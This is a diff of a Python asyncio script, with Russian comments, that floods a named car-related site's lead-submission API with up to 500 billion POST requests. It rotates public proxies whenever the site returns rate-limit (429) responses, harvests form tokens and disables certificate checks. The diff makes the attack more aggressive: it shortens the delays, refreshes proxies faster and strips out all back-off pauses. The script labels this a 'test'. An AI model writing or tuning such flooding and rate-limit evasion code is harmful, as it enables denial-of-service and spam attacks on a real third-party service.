@@ -22,8 +22,8 @@ from aiohttp_socks import ProxyConnector
 TARGET_URL = "https://avto-trak.com/api/leads" 
 
 TOTAL_REQUESTS = 500000000000       # Общее количество запросов
-DELAY_BETWEEN_REQ = 0.5      # Пауза перед отправкой следующего запроса в рамках воркера
-MAX_CONCURRENT = 500     # Количество параллельных воркеров (потоков)
+DELAY_BETWEEN_REQ = 0.05      # Пауза перед отправкой следующего запроса в рамках воркера
+MAX_CONCURRENT = 150     # Количество параллельных воркеров (потоков)
 
 init(autoreset=True)
 
@@ -80,7 +80,7 @@ class ProxyPool:
                     print(f"[!] Ошибка обновления пула из {url.split('/')[2]}: {e}")
                     continue
             
-            await asyncio.sleep(420)
+            await asyncio.sleep(180)
 
     async def get_proxy(self):
         """Выдает случайный прокси из пула"""
@@ -165,9 +165,6 @@ async def send_lead_task(task_id, payload):
             ssl_context.check_hostname = False
             ssl_context.verify_mode = ssl.CERT_NONE
 
-            # Используем TCPConnector с поддержкой прокси через параметр в post или через ProxyConnector
-            # В aiohttp для динамической смены прокси на лету удобнее передавать параметр proxy в session.post или использовать ClientSession с базовым прокси.
-            # Поскольку сессия создается на один POST (или переиспользуется), сделаем вызов через ClientSession с нужным коннектором:
             try:
                 if current_proxy:
                     proxy_url = current_proxy if "://" in current_proxy else f"http://{current_proxy}"
@@ -188,7 +185,6 @@ async def send_lead_task(task_id, payload):
                                 print(Fore.YELLOW + f"[!] Фоновая таска {task_id}: Получен статус 429 (Лимит). Меняем IP...")
                                 if current_proxy and PROXY_POOL.is_enabled:
                                     await PROXY_POOL.remove_proxy(current_proxy)
-                                await asyncio.sleep(1)
                                 continue # Переходим к следующей итерации с новым прокси
                                 
                             elif response.status in (200, 201):
@@ -205,17 +201,14 @@ async def send_lead_task(task_id, payload):
                                 # При ошибке сервера можно попробовать сменить прокси и повторить
                                 if current_proxy and PROXY_POOL.is_enabled:
                                     await PROXY_POOL.remove_proxy(current_proxy)
-                                await asyncio.sleep(1)
                                 
                 except (aiohttp.ClientError, asyncio.TimeoutError, ssl.SSLError, OSError) as e:
                     if current_proxy and PROXY_POOL.is_enabled:
-                        await PROXY_POOL.remove_proxy(current_proxy)
-                    await asyncio.sleep(1)
+                        await PROXY_POOL.remove_proxy(current_proxy) 
                     # Цикл продолжит работу со следующим прокси
             except Exception as e:
                 if current_proxy and PROXY_POOL.is_enabled:
                     await PROXY_POOL.remove_proxy(current_proxy)
-                await asyncio.sleep(1)
                 # Цикл продолжит работу со следующим прокси
 
 async def worker(worker_id):
@@ -260,7 +253,6 @@ async def worker(worker_id):
                         form_token = token_data.get("token", "") 
                         
                         if not form_token:
-                            await asyncio.sleep(1)
                             continue
 
                         print(Fore.GREEN + f"[DEBUG] Воркер {worker_id} получил токен: {form_token}")
@@ -300,11 +292,9 @@ async def worker(worker_id):
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                 if current_proxy:
                     await PROXY_POOL.remove_proxy(current_proxy)
-                await asyncio.sleep(1)
                 continue 
               
             except Exception as e:
-                await asyncio.sleep(1)
                 continue
 async def main():
     print(f"[*] Запуск асинхронного теста для: {TARGET_URL}")
@@ -320,6 +310,7 @@ async def main():
         print("[*] Включен режим динамического пула прокси. Ожидание первой загрузки...")        
         while not PROXY_POOL.proxies:
             await asyncio.sleep(1)
+            
 
     workers = [
         asyncio.create_task(worker(worker_id))
